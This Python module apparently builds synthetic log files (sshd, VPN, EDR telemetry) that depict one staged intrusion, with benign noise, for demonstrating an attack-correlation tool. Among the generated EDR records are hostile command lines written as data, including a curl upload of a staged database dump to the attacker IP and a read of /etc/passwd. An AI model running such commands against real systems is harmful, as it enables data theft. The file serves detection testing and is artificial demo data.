"""Generates SYNTHETIC DEMONSTRATION DATA for KillChain.

Produces three realistic log files under data/demo/ describing ONE connected
multi-stage attack, plus benign background noise. All timestamps are fixed so
the demonstration is reproducible.

Attack storyline (2026-10-30, night):
  1. 02:10-02:26  External IP 185.220.101.34 brute-forces 'svc-backup' on WEB-01
  2. 02:27        Successful SSH login for svc-backup from the same IP
  3. 02:29-02:33  Discovery commands executed on WEB-01 (whoami, ipconfig, net user)
  4. 02:36        Lateral movement: SSH from WEB-01 to DB-01 reusing svc-backup
  5. 02:41-02:52  On DB-01: discovery + FAILED privilege escalation (sudo -> root)
  6. 02:55        Database dump staged to /tmp on DB-01 (actions on objectives)

A separate odd-hour VPN login by 'admin' from another external IP is included
as background suspicious activity that must NOT be merged into the main
incident (different user, IP, host - no shared evidence).
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

from .. import config

SEED = 1337

# --- Environment constants -------------------------------------------------
ATTACKER_IP = "185.220.101.34"
VPN_ANOMALY_IP = "91.240.118.172"
WEB01, WEB01_IP = "WEB-01", "10.20.6.15"
DB01, DB01_IP = "DB-01", "10.20.6.20"
FILESRV, FILESRV_IP = "FILESRV-01", "10.20.6.30"
VPN_GW = "VPN-GW-02"

SVC = "svc-backup"
ADMIN = "administrator"

BASE = datetime(2026, 10, 30, 0, 0, 0)  # syslog lines carry no year; parser adds 2026


def _t(h: int, m: int, s: int) -> datetime:
    return BASE.replace(hour=h, minute=m, second=s)


def _syslog(dt: datetime, host: str, tag: str, msg: str) -> str:
    return f'{dt.strftime("%b %d %H:%M:%S")} {host} {tag}: {msg}'


# ---------------------------------------------------------------------------
# auth_gateway.log  (syslog: sshd on WEB-01 + openvpn on VPN-GW-02)
# ---------------------------------------------------------------------------
def gen_auth_gateway(path: Path) -> int:
    rng = random.Random(SEED)
    lines: list[str] = []
    noise_users = [
        "jwilliams", "mchen", "arodriguez", "kpate1", "sokonkwo", "dfinn",
        "ltran", "bharper", "emorris", "ykimura", "cda Silva".replace(" ", ""),
        "novak", "rbarnes", "tibarra", "gsuzuki", "holsen", "mgeorgiou",
        "pferrari", "anovakova", "jdoyle", "kreshnik", "wzhang", "bokafor",
        "svc-jenkins", "svc-monitor",
    ]
    noise_ips = [f"10.20.{r}.{100 + i}" for i, r in enumerate([3] * 13 + [4] * 13)]

    # --- benign business-hours SSH activity on WEB-01 (day before + day of) ---
    for day in (29, 30):
        for i in range(120):
            u = rng.choice(noise_users)
            ip = rng.choice(noise_ips)
            h = rng.choice([8, 9, 10, 11, 13, 14, 15, 16, 17])
            dt = datetime(2026, 10, day, h, rng.randrange(0, 60), rng.randrange(0, 60))
            if rng.random() < 0.9:
                lines.append((_t(dt.hour, dt.minute, dt.second), _syslog(
                    dt, WEB01, f"sshd[{2000 + i}]",
                    f"Accepted publickey for {u} from {ip} port {rng.randrange(30000, 60000)} ssh2")))
            else:
                lines.append((_t(dt.hour, dt.minute, dt.second), _syslog(
                    dt, WEB01, f"sshd[{2000 + i}]",
                    f"Failed password for {u} from {ip} port {rng.randrange(30000, 60000)} ssh2")))

    # a few scattered benign failures (never >= threshold per user+ip window)
    for i, u in enumerate(["jwilliams", "mchen", "ltran", "bharper", "rbarnes"]):
        dt = _t(9, 0, 8) + timedelta(minutes=12 + i * 37)
        lines.append((dt, _syslog(dt, WEB01, f"sshd[{3100 + i}]",
                                  f"Failed password for {u} from 10.20.3.118 port {40000 + i} ssh2")))

    # --- STAGE 1: brute force against svc-backup from attacker IP ------------
    brute = [
        (2, 10, 5), (2, 10, 41), (2, 11, 18), (2, 12, 2), (2, 12, 55),
        (2, 14, 20), (2, 15, 3), (2, 16, 44), (2, 18, 9), (2, 19, 51),
        (2, 21, 30), (2, 23, 12), (2, 25, 2), (2, 26, 38),
    ]
    for i, (h, m, s) in enumerate(brute):
        dt = _t(h, m, s)
        lines.append((dt, _syslog(dt, WEB01, f"sshd[{4200 + i}]",
                                  f"Failed password for {SVC} from {ATTACKER_IP} port {51000 + i * 7} ssh2")))
    # failures for root too (part of same brute-force burst)
    for i, (h, m, s) in enumerate([(2, 11, 44), (2, 13, 21), (2, 17, 36), (2, 22, 5)]):
        dt = _t(h, m, s)
        lines.append((dt, _syslog(dt, WEB01, f"sshd[{4250 + i}]",
                                  f"Failed password for root from {ATTACKER_IP} port {51101 + i * 7} ssh2")))

    # --- STAGE 2: successful compromise --------------------------------------
    dt = _t(2, 27, 14)
    lines.append((dt, _syslog(dt, WEB01, "sshd[4311]",
                              f"Accepted password for {SVC} from {ATTACKER_IP} port 51402 ssh2")))
    # session opened/closed syslog noise for realism
    lines.append((dt + timedelta(seconds=1), _syslog(
        dt + timedelta(seconds=1), WEB01,
        "sshd[4311]", f"pam_unix(sshd:session): session opened for user {SVC}(uid=1104) by (uid=0)")))

    # --- benign post-midnight backups ---------------------------------------
    for i in range(6):
        dt = _t(1, 15, 30) + timedelta(minutes=i * 10)
        lines.append((dt, _syslog(dt, WEB01, f"sshd[195{i}]",
                                  f"Accepted publickey for svc-monitor from 10.20.4.190 port {33000 + i} ssh2")))

    # --- VPN anomaly (must NOT correlate with the main chain) ----------------
    dt = _t(3, 10, 22)
    lines.append((dt, _syslog(dt, VPN_GW, "openvpn[991]",
                              f"user {ADMIN}/10.44.7.9: authentication succeeded from {VPN_ANOMALY_IP}:44312")))
    dt = _t(3, 10, 21)
    lines.append((dt, _syslog(dt, VPN_GW, "openvpn[991]",
                              f"user {ADMIN}/10.44.7.9: TLS handshake failed from {VPN_ANOMALY_IP}:44311")))
    # benign VPN logins through the day
    for i in range(25):
        u = rng.choice(noise_users[:12])
        dt = _t(rng.choice([7, 8, 9, 12, 17, 18]), rng.randrange(0, 60), rng.randrange(0, 60))
        lines.append((dt, _syslog(dt, VPN_GW, "openvpn[991]",
                                  f"user {u}/10.44.7.{i}: authentication succeeded from 10.44.7.{50 + i}:4{1000 + i}")))

    lines.sort(key=lambda x: x[0])
    path.write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")
    return len(lines)


# ---------------------------------------------------------------------------
# edr_endpoints.jsonl  (EDR telemetry: process creation + network events)
# ---------------------------------------------------------------------------
def gen_edr(path: Path) -> int:
    def ev(dt: datetime, **kw) -> str:
        import json
        rec = {"timestamp": dt.strftime("%Y-%m-%dT%H:%M:%S.000Z"), **kw}
        return json.dumps(rec)

    out: list[str] = []
    # benign telemetry on a workstation through the day
    benign = [
        ("WIN-7-FIN-02", "finance.alice", "OUTLOOK.EXE", None, None),
        ("WIN-7-FIN-02", "finance.alice", "chrome.exe", None, None),
        ("WIN-12-HR-04", "hr.bob", "excel.exe", None, None),
        ("WIN-3-ENG-11", "dev.carol", "code.exe", None, None),
    ]
    rng = random.Random(SEED + 1)
    for i in range(90):
        host, user, proc, _, _ = rng.choice(benign)
        dt = datetime(2026, 10, 30, rng.choice([9, 10, 11, 14, 15, 16]), rng.randrange(0, 60), rng.randrange(0, 60))
        out.append(ev(dt, host=host, event="ProcessCreate", event_id=4688,
                      user=f"{host}\\{user}", process=proc, pid=rng.randrange(1000, 9999),
                      parent="explorer.exe", command_line=proc, outcome="success"))

    # --- STAGE 3: discovery on WEB-01 after compromise -----------------------
    disc = [
        (2, 29, 41, "whoami.exe", "whoami /all", "cmd.exe"),
        (2, 30, 12, "ipconfig.exe", "ipconfig /all", "cmd.exe"),
        (2, 31, 5, "net.exe", "net user /domain", "cmd.exe"),
        (2, 32, 48, "nltest.exe", "nltest /dclist:corp", "cmd.exe"),
        (2, 33, 19, "net.exe", "net group \u201cDomain Admins\u201d /domain".replace("\u201c", '"').replace("\u201d", '"'), "cmd.exe"),
    ]
    for h, m, s, proc, cl, parent in disc:
        dt = _t(h, m, s)
        out.append(ev(dt, host=WEB01, event="ProcessCreate", event_id=4688,
                      user=f"{WEB01}\\{SVC}", process=proc, pid=6600 + s,
                      parent=parent, command_line=cl, outcome="success"))

    # --- STAGE 4: lateral movement WEB-01 -> DB-01 ---------------------------
    dt = _t(2, 36, 2)
    out.append(ev(dt, host=WEB01, event="ProcessCreate", event_id=4688,
                  user=f"{WEB01}\\{SVC}", process="ssh.exe", pid=7311,
                  parent="cmd.exe",
                  command_line=f"ssh -o StrictHostKeyChecking=no {SVC}@{DB01_IP}",
                  outcome="success", src_ip=WEB01_IP, dst_ip=DB01_IP))
    dt = _t(2, 36, 3)
    out.append(ev(dt, host=WEB01, event="NetworkConnect", event_id=5156,
                  user=f"{WEB01}\\{SVC}", process="ssh.exe", pid=7311,
                  command_line=f"ssh {SVC}@{DB01_IP}", outcome="success",
                  src_ip=WEB01_IP, dst_ip=DB01_IP, dst_port=22,
                  action="ssh"))
    # a port scan sweep from the compromised host (recon of neighbors)
    for i, port in enumerate([445, 3389, 5985]):
        dt = _t(2, 38, 10 + i * 4)
        out.append(ev(dt, host=WEB01, event="NetworkConnect", event_id=5156,
                      user=f"{WEB01}\\{SVC}", process="powershell.exe", pid=7402 + i,
                      command_line=f"powershell -c Test-NetConnection {FILESRV_IP} -Port {port}",
                      outcome="failure" if port == 5985 else "success",
                      src_ip=WEB01_IP, dst_ip=FILESRV_IP, dst_port=port,
                      action="network_probe"))

    # --- STAGE 5/6: on DB-01 (Linux EDR): privilege escalation + staging -----
    linux_events = [
        (2, 41, 30, "ps", "ps aux --sort=-%mem", "sshd"),
        (2, 43, 11, "cat", "cat /etc/passwd", "bash"),
        (2, 44, 55, "net", "net group \"Domain Admins\" corp-db\\{SVC}".replace("{SVC}", SVC), "bash"),
        (2, 47, 33, "sudo", "sudo su -", "bash"),
        (2, 49, 2, "mysqldump", "mysqldump -u backup_svc -p customers customers_db > /tmp/.bk_cache.sql", "bash"),
        (2, 52, 26, "tar", "tar czf /tmp/.bk_cache.tgz /tmp/.bk_cache.sql", "bash"),
        (2, 53, 40, "curl", f"curl -T /tmp/.bk_cache.tgz http://{ATTACKER_IP}:8080/upload", "bash"),
    ]
    for h, m, s, proc, cl, parent in linux_events:
        dt = _t(h, m, s)
        extra = {"dst_ip": ATTACKER_IP} if proc == "curl" else {}
        out.append(ev(dt, host=DB01, event="ProcessCreate", event_id=4688,
                      user=f"{DB01}\\{SVC}", process=proc, pid=2200 + s,
                      parent=parent, command_line=cl, outcome="success",
                      src_ip=WEB01_IP, **extra))

    # benign linux-ish backup job on DB-01 earlier
    dt = _t(1, 30, 0)
    out.append(ev(dt, host=DB01, event="ProcessCreate", event_id=4688,
                  user=f"{DB01}\\svc-backup", process="backup_agent", pid=1200,
                  parent="cron", command_line="/opt/backup/run.sh --nightly", outcome="success"))

    out.sort(key=lambda l: __import__("json").loads(l)["timestamp"])
    path.write_text("\n".join(out) + "\n", encoding="utf-8")
    return len(out)


# ---------------------------------------------------------------------------
# db_server.log  (syslog: sshd + sudo on DB-01)
# ---------------------------------------------------------------------------
def gen_db_server(path: Path) -> int:
    rng = random.Random(SEED + 2)
    lines: list[tuple[datetime, str]] = []
    # benign ops logins
    for i in range(40):
        u = rng.choice(["dbadmin", "svc-monitor", "ops.nadia", "ops.tarek"])
        dt = datetime(2026, 10, 30, rng.choice([6, 7, 8, 9, 10, 11, 12, 13, 14]),
                      rng.randrange(0, 60), rng.randrange(0, 60))
        lines.append((dt, _syslog(dt, DB01, f"sshd[{1500 + i}]",
                                  f"Accepted publickey for {u} from 10.20.4.190 port {34000 + i} ssh2")))
    for i in range(12):
        dt = datetime(2026, 10, 30, rng.choice([7, 8, 9, 10, 11]),
                      rng.randrange(0, 60), rng.randrange(0, 60))
        lines.append((dt, _syslog(dt, DB01, f"sudo[{1600 + i}]",
                                  f"  dbadmin : TTY=pts/0 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/usr/bin/systemctl restart mysql")))

    # STAGE 4 evidence: attacker connects from WEB-01
    dt = _t(2, 36, 4)
    lines.append((dt, _syslog(dt, DB01, "sshd[8811]",
                              f"Accepted password for {SVC} from {WEB01_IP} port 40022 ssh2")))
    lines.append((_t(2, 36, 5), _syslog(_t(2, 36, 5), DB01, "sshd[8811]",
                f"pam_unix(sshd:session): session opened for user {SVC}(uid=1104) by (uid=0)")))

    # STAGE 5 evidence: failed sudo attempts (privilege escalation attempt)
    for i, (h, m, s) in enumerate([(2, 47, 33), (2, 47, 51), (2, 48, 9)]):
        dt = _t(h, m, s)
        lines.append((dt, _syslog(dt, DB01, f"sudo[910{i}]",
                                  f"  {SVC} : {i + 1} incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/su")))

    lines.sort(key=lambda x: x[0])
    path.write_text("\n".join(l for _, l in lines) + "\n", encoding="utf-8")
    return len(lines)


def generate_demo_files() -> dict[str, Path]:
    files = {
        "auth_gateway.log": config.DEMO_DIR / "auth_gateway.log",
        "edr_endpoints.jsonl": config.DEMO_DIR / "edr_endpoints.jsonl",
        "db_server.log": config.DEMO_DIR / "db_server.log",
    }
    gen_auth_gateway(files["auth_gateway.log"])
    gen_edr(files["edr_endpoints.jsonl"])
    gen_db_server(files["db_server.log"])
    return files
